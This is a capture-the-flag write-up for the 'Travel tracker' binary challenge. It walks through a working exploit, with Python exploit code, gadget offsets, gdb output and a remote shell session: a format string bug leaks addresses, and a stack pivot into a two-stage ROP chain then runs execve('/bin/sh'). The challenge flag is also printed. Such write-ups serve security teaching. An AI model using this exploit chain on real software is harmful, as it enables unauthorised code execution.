# 🔥 Travel tracker 🔥
Author: nordbo

Flag: `EPT{l3gacy_l0v3}`
## Description
```
I found our legacy travel tracker, does it still work?
```

## Provided challenge files
* [travel_tracker.tar.gz](travel_tracker.tar.gz)

## Writeup

kileak (Super Guesser)

Attachment: [xpl.py](xpl.py)

```
Travel Tracker Menu
1. Add airport review
2. View all airport reviews
3. Save all airport reviews to file
4. Modify an airport review
5. Exit
Enter your choice: 
```

Travel tracker lets us add, view and edit reviews. Nothing special there, but it also contains an option to save the reviews.

```c
void saveReviewsToFile() {
    //There was a bug when writing to file.
    //Fixed by writing to the void.
    FILE *file = fopen("/dev/null", "w");
    if (file == NULL) {
        perror("Error opening file");
        return;
    }

    for (int i = 0; i < reviewCount; i++) {
       writeToFile(i, file);
    }

    fclose(file);
    printf("Reviews have been saved. \n");
}

void writeToFile(int i, FILE *file) {
    char* comment = reviews[i]->comment;
    fprintf(file, "Airport Code");
    fprintf(file, reviews[i]->airportCode);
    fprintf(file, "\nRating: %d\n", reviews[i]->rating);
    fprintf(file, "Comment: %s\n\n", comment);
}
```

This will open `/dev/null` and then print the review to it. `writeToFile` contains a format string vulnerability, since it just calls

```c
fprintf(file, reviews[i]->airportCode);
```

We won't be able to see the output of it, since it's written to `/dev/null`, but we can still exploit it. `airportCode` can only contain 10 chars, so it will be a bit of a hassle to do something useful with it.

With gdb we can find the possible parameters, that can be used

```
1 : 0xffffd3a8│+0x0000: 0x0000000c
2 : 0xffffd3ac│+0x0004: 0x5655a2d0  →  0xfbad2c84
3 : 0xffffd3b0│+0x0008: 0x565571d1  →  "/dev/null"
4 : 0xffffd3b4│+0x000c: 0x565571cf  →  0x642f0077 ("w"?)
5 : 0xffffd3b8│+0x0010: 0x00000001
6 : 0xffffd3bc│+0x0014: 0x5655a1c0  →  "AAAAAAAAAAAAAAAAAAAAA[...]"
7 : 0xffffd3c0│+0x0018: 0xffffd4e4  →  0xffffd64a  
8 : 0xffffd3c4│+0x001c: 0x56558f80  →  0x00003e88
9 : 0xffffd3c8│+0x0020: 0xffffd3f8 
...
```

Parameter 6 will contain a pointer to our `comment` chunk on the heap. Since we first need some leaks, we can use this to write into the `comment` field to get some pointers.

Though as already mentioned, the possible format string is only 10 chars and the string is on the heap, so we cannot reuse addresses from our input.

But we can use a neat little trick using dynamic width parameters for `printf`

```
%*3$u%6$n
```

With `*3` we specify, that the width for the string should come from the third format string parameter. This would write a string with `0x565571d1` whitespaces. `%6$n` will then write the count of written characters to the address at parameter 6, which is our comment chunk.

This will effectively write `0x565571d1` into our comment field, which we then can read via `View all airport reviews`.

We'll use this, to leak an ELF, heap and libc address.

```python
def leak(offset):
    payload = "%*{0}$u%6$n".format(offset)
    edit(1, payload, 9, "A"*8)
    writetofile()
    LEAK = u32(view().split("Comment: ")[1][:4].ljust(4, "\x00"))
    return LEAK

def exploit(r):
    r.recvuntil("choice: ")

    # create initial review
    add("AAAA", 9, "AAAA")

    # leak ELF / heap and libc address
    PIELEAK = leak(3)
    HEAPLEAK = leak(6)
    LIBCLEAK = 0x100000000 - leak(13)
```

```
[*] PIE leak     : 0x565571d1
[*] ELF          : 0x56555000
[*] HEAP leak    : 0x5655a1c0
[*] LIBC  leak   : 0xf7fb3620
[*] LIBC         : 0xf7d89000
```

With those addresses at hand, we can now craft a ropchain in our `comment` chunk and try to pivot the stack into it.

We can again use the dynamic width trick to now write the address of our comment chunk into `ebp`, which parameter 9 points to.

```
%*6$u%9$n
```

This will take the address of `comment` from parameter 6 as width and then writes it to parameter 9.

```
0x565564b2 <+277>:	lea    esp,[ebp-0x8]
0x565564b5 <+280>:	pop    ecx
0x565564b6 <+281>:	pop    ebx
0x565564b7 <+282>:	pop    ebp
0x565564b8 <+283>:	lea    esp,[ecx-0x4]
0x565564bb <+286>:	ret
```

The prologue of main would then move the stack 8 bytes before our heap chunk, pop `ecx` from there and then loads `ecx-0x4` into `esp` again.

So we cannot directly pivot into our chunk. To get around this, we can first allocate a bigger `comment` chunk, fill it up with addresses to our final `comment` chunk, free it via `edit` and then trigger the stack pivot.

```python
# create a heap chunk filled with address to rop chain
payload = p32(HEAPLEAK+0x180+4)*(0x100)
add(b"A", 9, payload)
edit(2, "A", 9, "A")

POP1 = e.address + 0x15e6    
POPECXEAX = libc.address + 0x128124
POPEBX = e.address + 0x1022    
POPEDX = libc.address + 0x37375
SYSCALL = libc.address + 0x37765
POPESP = libc.address + 0x000262de

log.info("Send stage 1 ropchain")

rop = ""    
rop += p32(libc.symbols["gets"])    
rop += p32(POP1)
rop += p32(e.address + 0x4550)
rop += p32(POPESP)
rop += p32(e.address + 0x4550)
    
# write chunk address into stack pointer
payload = "%*6$u%9$n"

edit(1, payload, 9, rop)
writetofile()

# exit to trigger ropchain
r.sendline("5)
```

While locally, I could just do a `system("/bin/sh")` ropchain, it didn't work out remote, so I opted for a stage ropchain.

Since the comment will be moved to the heap via `strcpy` it must not contain any null bytes, but for an `execve("/bin/sh", 0, 0)` ropchain, I'd need some. So the first ropchain will just read the final chain into `bss` and then stack pivot there.

```
───────────────────────────────────────────── registers ────
$eax   : 0x0       
$ebx   : 0x56558f80  →  0x00003e88
$ecx   : 0xf7fb49b4  →  0x00000000
$edx   : 0x1       
$esp   : 0xffffddf0  →  0xffffde30  →  0xf7fb3000  →  0x00229dac
$ebp   : 0x5655a340  →  0xf7dfb8f0  →  0xfb1e0ff3
$esi   : 0xffffded4  →  0xffffdfbf  →  "./travel_tracker"
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x565564b2  →  <main+277> lea esp, [ebp-0x8]
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
─────────────────────────────────────────── code:x86:32 ────
   0x565564a3 <main+262>       cmp    DWORD PTR [ebp-0xc], 0x5
   0x565564a7 <main+266>       jne    0x565563c4 <main+39>
   0x565564ad <main+272>       mov    eax, 0x0
 → 0x565564b2 <main+277>       lea    esp, [ebp-0x8]
   0x565564b5 <main+280>       pop    ecx
   0x565564b6 <main+281>       pop    ebx
   0x565564b7 <main+282>       pop    ebp
   0x565564b8 <main+283>       lea    esp, [ecx-0x4]
   0x565564bb <main+286>       ret    
───────────────────────────────────────────────── stack ────
0xffffddf0│+0x0000: 0xffffde30  →  0xf7fb3000  →  0x00229dac	 ← $esp
0xffffddf4│+0x0004: 0xf7fbe65c  →  0xf7ffdba0  →  0xf7fbe800  →  0xf7ffda40  →  0x56555000  →  0x464c457f
0xffffddf8│+0x0008: 0xf7fbebc0  →  0xf7da3cc6  →  "GLIBC_PRIVATE"
0xffffddfc│+0x000c: 0x00000003
0xffffde00│+0x0010: 0xffffde20  →  0x00000001
0xffffde04│+0x0014: 0xf7fb3000  →  0x00229dac
────────────────────────────────────────────────────────────
```

After `pop ecx`

```
───────────────────────────────────────────── registers ────
$eax   : 0x0       
$ebx   : 0x56558f80  →  0x00003e88
$ecx   : 0xf7fb49b4  →  0x00000000
$edx   : 0x1       
$esp   : 0x5655a338  →  0x5655a344  →  0x565565e6  →  <addReview+298> pop ebp
$ebp   : 0x5655a340  →  0xf7dfb8f0  →  0xfb1e0ff3
$esi   : 0xffffded4  →  0xffffdfbf  →  "./travel_tracker"
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x565564b5  →  <main+280> pop ecx
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
─────────────────────────────────────────── code:x86:32 ────
   0x565564a7 <main+266>       jne    0x565563c4 <main+39>
   0x565564ad <main+272>       mov    eax, 0x0
   0x565564b2 <main+277>       lea    esp, [ebp-0x8]
 → 0x565564b5 <main+280>       pop    ecx
   0x565564b6 <main+281>       pop    ebx
   0x565564b7 <main+282>       pop    ebp
   0x565564b8 <main+283>       lea    esp, [ecx-0x4]
   0x565564bb <main+286>       ret    
   0x565564bc <addReview+0>    push   ebp
───────────────────────────────────────────────── stack ────
0x5655a338│+0x0000: 0x5655a344  →  0x565565e6  →  <addReview+298> pop ebp	 ← $esp
0x5655a33c│+0x0004: 0x00000021 ("!"?)
0x5655a340│+0x0008: 0xf7dfb8f0  →  0xfb1e0ff3	 ← $ebp
0x5655a344│+0x000c: 0x565565e6  →  <addReview+298> pop ebp
0x5655a348│+0x0010: 0x56559550  →  0x00000000
0x5655a34c│+0x0014: 0xf7daf2de  →  0x5f5e5b5c
────────────────────────────────────────────────────────────
```

So `ecx` now points exactly to `comment+0x4`, and `lea esp, [ecx-0x4]` will stack pivot into the comment chunk.

```
───────────────────────────────────────────── registers ────
$eax   : 0x0       
$ebx   : 0x21      
$ecx   : 0x5655a344  →  0x565565e6  →  <addReview+298> pop ebp
$edx   : 0x1       
$esp   : 0x5655a340  →  0xf7dfb8f0  →  0xfb1e0ff3
$ebp   : 0xf7dfb8f0  →  0xfb1e0ff3
$esi   : 0xffffded4  →  0xffffdfbf  →  "./travel_tracker"
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x565564bb  →  <main+286> ret 
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
─────────────────────────────────────────── code:x86:32 ────
   0x565564b6 <main+281>       pop    ebx
   0x565564b7 <main+282>       pop    ebp
   0x565564b8 <main+283>       lea    esp, [ecx-0x4]
 → 0x565564bb <main+286>       ret    
   ↳  0xf7dfb8f0                  endbr32 
      0xf7dfb8f4                  push   ebp
      0xf7dfb8f5                  mov    ebp, esp
      0xf7dfb8f7                  push   edi
      0xf7dfb8f8                  call   0xf7efae3d
      0xf7dfb8fd                  add    edi, 0x1b7703
───────────────────────────────────────────────── stack ────
0x5655a340│+0x0000: 0xf7dfb8f0  →  0xfb1e0ff3	 ← $esp
0x5655a344│+0x0004: 0x565565e6  →  <addReview+298> pop ebp	 ← $ecx
0x5655a348│+0x0008: 0x56559550  →  0x00000000
0x5655a34c│+0x000c: 0xf7daf2de  →  0x5f5e5b5c
0x5655a350│+0x0010: 0x56559550  →  0x00000000
0x5655a354│+0x0014: 0x5655a300  →  0x00000000
────────────────────────────────────────────────────────────
```

We can now send the second ropchain, which will then do `execve("/bin/sh", 0, 0)`

```
log.info("Send stage 2 ropchain")

POPECXEAX = libc.address + 0x128124
POPEBX = e.address + 0x1022    
POPEDX = libc.address + 0x37375
SYSCALL = libc.address + 0x37765

rop = ""
rop += p32(0)
rop += p32(0)
rop += p32(0)
rop += p32(0)
rop += p32(POPECXEAX)
rop += p32(0)
rop += p32(11)
rop += p32(POPEBX)
rop += p32(next(libc.search("/bin/sh")))
rop += p32(POPEDX)
rop += p32(0)
rop += p32(SYSCALL)
    
r.sendline(rop)
```

which then finally lands a shell

```
[+] Opening connection to io.ept.gg on port 51041: Done
[*] PIE leak     : 0x565b51d1
[*] ELF          : 0x565b3000
[*] HEAP leak    : 0x56c861c0
[*] LIBC  leak   : 0xf7fa7620
[*] LIBC         : 0xf7d7d000
[*] Switching to interactive mode
Exiting the program...
$ ls
travel_tracker
ynetd
$ cat /opt/flag
EPT{l3gacy_l0v3}$  
```